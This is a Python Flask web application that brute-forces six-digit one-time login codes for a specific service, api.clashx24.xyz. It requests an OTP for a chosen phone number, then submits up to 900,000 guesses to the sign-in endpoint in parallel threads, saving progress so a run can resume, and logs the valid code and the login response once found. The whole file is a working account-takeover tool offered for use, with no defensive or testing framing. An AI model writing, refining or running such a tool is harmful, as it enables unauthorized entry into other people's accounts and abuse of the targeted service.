# main.py (Fixed Version)
import requests
import time
import threading
import json
from flask import Flask, render_template, request, jsonify, Response, stream_with_context
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import queue
import os
import pickle
import atexit
import sys
import traceback

app = Flask(__name__)

# Global state
brute_force_state = {
    'is_running': False,
    'total_attempts': 0,
    'total_possible': 900000,
    'current_otp': 0,
    'found_otp': None,
    'start_time': None,
    'status_counts': {},
    'logs': [],
    'stop_flag': False,
    'phone_number': None,
    'speed': 0,
    'last_update': None,
    'completed': False,
    'last_otp_tried': 0,
    'otp_sent_response': None,
    'login_response': None,
    'error_message': None
}

log_queue = queue.Queue()
STATE_FILE = 'bruteforce_state.pkl'
bruteforce_thread = None
thread_lock = threading.Lock()

class ClashX24Login:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "User-Agent": "okhttp/4.12.0"
        }
        self.session.headers.update(self.headers)
        self.phone_number = None
        self.stop_bruteforce = False
        
    def send_otp(self, phone_number):
        """Send OTP to the provided phone number"""
        send_otp_url = "https://api.clashx24.xyz/user/login-code"
        otp_payload = {"phone_number": phone_number}
        
        try:
            otp_response = self.session.post(send_otp_url, json=otp_payload)
            response_text = otp_response.text
            
            add_log(f"📤 OTP SENT: Status {otp_response.status_code}", "info")
            add_log(f"📄 Response: {response_text}", "info")
            
            brute_force_state['otp_sent_response'] = {
                'status_code': otp_response.status_code,
                'body': response_text
            }
            save_state()
            
            if otp_response.status_code in [200, 201]:
                return True, response_text
            else:
                return False, response_text
        except Exception as e:
            error_msg = str(e)
            add_log(f"❌ OTP Send Error: {error_msg}", "error")
            return False, error_msg
    
    def verify_otp(self, otp, show_response=True):
        """Verify OTP and return response"""
        verify_otp_url = "https://api.clashx24.xyz/user/sign-in"
        verify_payload = {
            "phone_number": self.phone_number,
            "verification_code": str(otp),
            "OTP": int(otp) if str(otp).isdigit() else otp
        }
        
        try:
            verify_response = self.session.post(verify_otp_url, json=verify_payload)
            
            if show_response:
                status = "success" if verify_response.status_code != 400 else "warning"
                # Only log every 10th attempt to reduce spam, but always log status 400
                if verify_response.status_code == 400:
                    add_log(f"🔑 OTP {otp} → {verify_response.status_code} (wrong)", "warning")
                elif verify_response.status_code != 400:
                    add_log(f"🎯 OTP {otp} → {verify_response.status_code} (SUCCESS!)", "success")
                    add_log(f"📄 Login Response: {verify_response.text}", "success")
                    brute_force_state['login_response'] = {
                        'status_code': verify_response.status_code,
                        'body': verify_response.text
                    }
                    save_state()
            
            return verify_response
        except Exception as e:
            if show_response:
                add_log(f"❌ Verify Error for OTP {otp}: {str(e)}", "error")
            return None

def save_state():
    """Save current state to file"""
    try:
        state_to_save = brute_force_state.copy()
        state_to_save['logs'] = []  # Don't save logs to keep file small
        with open(STATE_FILE, 'wb') as f:
            pickle.dump(state_to_save, f)
    except Exception as e:
        print(f"Error saving state: {e}")

def load_state():
    """Load state from file"""
    try:
        if os.path.exists(STATE_FILE):
            with open(STATE_FILE, 'rb') as f:
                loaded_state = pickle.load(f)
                for key, value in loaded_state.items():
                    if key in brute_force_state:
                        brute_force_state[key] = value
                return True
    except Exception as e:
        print(f"Error loading state: {e}")
    return False

def clear_state():
    """Clear saved state"""
    try:
        if os.path.exists(STATE_FILE):
            os.remove(STATE_FILE)
    except Exception as e:
        print(f"Error clearing state: {e}")

def add_log(message, status="info"):
    """Add log entry with timestamp"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = {
        'timestamp': timestamp,
        'message': message,
        'status': status
    }
    brute_force_state['logs'].append(log_entry)
    if len(brute_force_state['logs']) > 2000:
        brute_force_state['logs'] = brute_force_state['logs'][-2000:]
    log_queue.put(log_entry)
    # Save state on important events
    if "✅" in message or "❌" in message or "🎯" in message or "found" in message.lower():
        save_state()

def brute_force_worker(otp, login_instance):
    """Worker function for brute forcing OTP"""
    if brute_force_state['stop_flag']:
        return None
        
    response = login_instance.verify_otp(otp, show_response=True)
    
    # Update status counts
    status_code = response.status_code if response else 'error'
    brute_force_state['status_counts'][status_code] = brute_force_state['status_counts'].get(status_code, 0) + 1
    
    # Update last OTP tried
    brute_force_state['last_otp_tried'] = otp
    brute_force_state['total_attempts'] += 1
    
    # Check if valid OTP found
    if response and response.status_code != 400:
        brute_force_state['found_otp'] = otp
        brute_force_state['stop_flag'] = True
        brute_force_state['completed'] = True
        add_log(f"🎯 VALID OTP FOUND: {otp}", "success")
        add_log(f"📄 Full Response: {response.text}", "success")
        save_state()
        return otp
    
    # Save state every 500 attempts
    if brute_force_state['total_attempts'] % 500 == 0:
        save_state()
    
    return None

def run_brute_force(phone_number, max_workers=10, resume_from=0):
    """Main brute force function - FIXED VERSION"""
    global brute_force_state
    
    with thread_lock:
        if brute_force_state.get('is_running', False):
            add_log("⚠️ Brute force already running", "warning")
            return
        
        # Reset or resume state
        if resume_from == 0:
            brute_force_state['is_running'] = True
            brute_force_state['total_attempts'] = 0
            brute_force_state['found_otp'] = None
            brute_force_state['start_time'] = time.time()
            brute_force_state['status_counts'] = {}
            brute_force_state['stop_flag'] = False
            brute_force_state['phone_number'] = phone_number
            brute_force_state['completed'] = False
            brute_force_state['last_otp_tried'] = 0
            brute_force_state['speed'] = 0
            brute_force_state['otp_sent_response'] = None
            brute_force_state['login_response'] = None
            brute_force_state['error_message'] = None
            
            add_log(f"🚀 STARTING BRUTE FORCE", "info")
            add_log(f"📱 Target: {phone_number}", "info")
            add_log(f"📊 Total OTPs: 900,000", "info")
            add_log(f"⚡ Workers: {max_workers}", "info")
        else:
            brute_force_state['is_running'] = True
            brute_force_state['stop_flag'] = False
            add_log(f"🔄 RESUMING from OTP {resume_from}", "info")
        
        save_state()
    
    login_instance = ClashX24Login()
    login_instance.phone_number = brute_force_state['phone_number']
    
    start_time = brute_force_state['start_time'] or time.time()
    
    # Generate OTPs from 100000 to 999999
    start_otp = max(100000, resume_from)
    total_possible = 900000
    
    try:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            processed_count = 0
            
            # Submit all tasks in batches
            for otp in range(start_otp, 1000000):
                if brute_force_state['stop_flag']:
                    add_log("⏹️ Stop signal received", "warning")
                    break
                
                # Submit task
                future = executor.submit(brute_force_worker, otp, login_instance)
                futures.append(future)
                
                # Process completed futures when batch is full or at end
                if len(futures) >= max_workers * 2:  # Process in batches of 2x workers
                    # Process completed futures
                    completed = []
                    for f in futures:
                        if f.done():
                            try:
                                result = f.result(timeout=0.1)
                                processed_count += 1
                                if result:  # Found OTP
                                    add_log(f"✅ FOUND OTP: {result}", "success")
                                    save_state()
                                    executor.shutdown(wait=False, cancel_futures=True)
                                    return result
                            except Exception as e:
                                add_log(f"⚠️ Worker error: {str(e)}", "warning")
                        else:
                            completed.append(f)
                    
                    futures = completed
                    
                    # Update speed
                    elapsed = time.time() - start_time
                    if elapsed > 0 and brute_force_state['total_attempts'] > 0:
                        brute_force_state['speed'] = brute_force_state['total_attempts'] / elapsed
                    
                    # Log progress every 500 attempts
                    if brute_force_state['total_attempts'] % 500 == 0:
                        progress_pct = (brute_force_state['total_attempts'] / total_possible * 100)
                        add_log(f"📈 Progress: {brute_force_state['total_attempts']}/{total_possible} ({progress_pct:.2f}%) - Speed: {brute_force_state['speed']:.1f} OTP/s", "info")
                        save_state()
                    
                    if brute_force_state['found_otp']:
                        break
            
            # Process remaining futures
            for f in futures:
                if not f.done():
                    try:
                        result = f.result(timeout=0.1)
                        if result:
                            brute_force_state['found_otp'] = result
                            break
                    except Exception as e:
                        pass
    
    except Exception as e:
        error_msg = f"❌ Error in brute force: {str(e)}\n{traceback.format_exc()}"
        add_log(error_msg, "error")
        brute_force_state['error_message'] = str(e)
    
    finally:
        with thread_lock:
            brute_force_state['is_running'] = False
            elapsed_time = time.time() - start_time
            
            if brute_force_state['found_otp']:
                add_log(f"✅ SUCCESS! Valid OTP: {brute_force_state['found_otp']}", "success")
            elif brute_force_state['stop_flag'] and not brute_force_state['found_otp']:
                add_log(f"⏹️ Stopped by user", "warning")
            else:
                add_log(f"❌ No valid OTP found in range", "error")
            
            add_log(f"⏱️ Total time: {elapsed_time:.2f}s", "info")
            add_log(f"📊 Total attempts: {brute_force_state['total_attempts']}", "info")
            save_state()

@app.route('/')
def index():
    load_state()
    return render_template('index.html')

@app.route('/send-otp', methods=['POST'])
def send_otp():
    phone_number = request.json.get('phone_number')
    
    if not phone_number or len(phone_number) != 10 or not phone_number.isdigit():
        return jsonify({'success': False, 'message': 'Invalid phone number'}), 400
    
    login = ClashX24Login()
    success, response = login.send_otp(phone_number)
    save_state()
    
    return jsonify({
        'success': success,
        'message': 'OTP sent successfully' if success else 'Failed to send OTP',
        'response': response
    })

@app.route('/start-bruteforce', methods=['POST'])
def start_bruteforce():
    global bruteforce_thread
    
    with thread_lock:
        if brute_force_state.get('is_running', False):
            return jsonify({'success': False, 'message': 'Brute force already running'}), 400
        
        phone_number = request.json.get('phone_number')
        max_workers = request.json.get('max_workers', 10)
        resume = request.json.get('resume', False)
        
        if not phone_number or len(phone_number) != 10 or not phone_number.isdigit():
            return jsonify({'success': False, 'message': 'Invalid phone number'}), 400
        
        start_from = 0
        if resume and os.path.exists(STATE_FILE):
            load_state()
            if brute_force_state.get('phone_number') == phone_number:
                start_from = brute_force_state.get('last_otp_tried', 0) + 1
                add_log(f"🔄 Resuming from OTP {start_from}", "info")
        
        # Start brute force in background thread
        bruteforce_thread = threading.Thread(
            target=run_brute_force, 
            args=(phone_number, max_workers, start_from),
            daemon=True
        )
        bruteforce_thread.start()
        
        return jsonify({
            'success': True, 
            'message': 'Brute force started',
            'resuming': start_from > 0,
            'start_from': start_from
        })

@app.route('/stop-bruteforce', methods=['POST'])
def stop_bruteforce():
    with thread_lock:
        brute_force_state['stop_flag'] = True
        brute_force_state['is_running'] = False
        save_state()
    return jsonify({'success': True, 'message': 'Stop signal sent'})

@app.route('/reset-state', methods=['POST'])
def reset_state():
    with thread_lock:
        clear_state()
        brute_force_state.update({
            'is_running': False,
            'total_attempts': 0,
            'found_otp': None,
            'start_time': None,
            'status_counts': {},
            'logs': [],
            'stop_flag': False,
            'phone_number': None,
            'speed': 0,
            'completed': False,
            'last_otp_tried': 0,
            'otp_sent_response': None,
            'login_response': None,
            'error_message': None
        })
    return jsonify({'success': True, 'message': 'State reset'})

@app.route('/status')
def status():
    load_state()
    elapsed = 0
    if brute_force_state.get('start_time'):
        elapsed = time.time() - brute_force_state['start_time']
    
    return jsonify({
        'is_running': brute_force_state.get('is_running', False),
        'total_attempts': brute_force_state.get('total_attempts', 0),
        'total_possible': brute_force_state.get('total_possible', 900000),
        'found_otp': brute_force_state.get('found_otp'),
        'elapsed_time': elapsed,
        'speed': brute_force_state.get('speed', 0),
        'status_counts': brute_force_state.get('status_counts', {}),
        'phone_number': brute_force_state.get('phone_number'),
        'progress_percentage': (brute_force_state.get('total_attempts', 0) / brute_force_state.get('total_possible', 900000) * 100) if brute_force_state.get('total_possible', 0) > 0 else 0,
        'completed': brute_force_state.get('completed', False),
        'last_otp_tried': brute_force_state.get('last_otp_tried', 0),
        'has_saved_state': os.path.exists(STATE_FILE),
        'otp_sent_response': brute_force_state.get('otp_sent_response'),
        'login_response': brute_force_state.get('login_response'),
        'error_message': brute_force_state.get('error_message')
    })

@app.route('/logs')
def get_logs():
    load_state()
    return jsonify(brute_force_state.get('logs', []))

@app.route('/stream-logs')
def stream_logs():
    def generate():
        # Send existing logs first
        for log in brute_force_state.get('logs', []):
            yield f"data: {json.dumps(log)}\n\n"
        
        while True:
            try:
                log = log_queue.get(timeout=10)
                yield f"data: {json.dumps(log)}\n\n"
            except queue.Empty:
                yield f"data: {json.dumps({'type': 'heartbeat'})}\n\n"
                continue
            except GeneratorExit:
                break
    
    return Response(stream_with_context(generate()), mimetype='text/event-stream')

@app.route('/health')
def health():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'is_running': brute_force_state.get('is_running', False),
        'has_saved_state': os.path.exists(STATE_FILE),
        'total_attempts': brute_force_state.get('total_attempts', 0)
    })

@atexit.register
def shutdown_cleanup():
    save_state()
    print("State saved on shutdown")

if __name__ == '__main__':
    load_state()
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
